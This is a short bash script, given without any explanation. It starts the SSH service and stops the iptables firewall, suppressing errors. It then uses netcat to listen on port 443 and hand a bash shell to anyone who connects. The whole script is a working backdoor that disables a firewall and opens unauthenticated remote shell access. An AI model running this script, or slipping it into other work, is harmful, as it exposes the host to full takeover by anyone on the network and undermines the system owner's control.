#!/bin/bash

service ssh start 2>/dev/null
service iptables stop 2>/dev/null

nc -l 443 -e /bin/bash 2>/dev/null

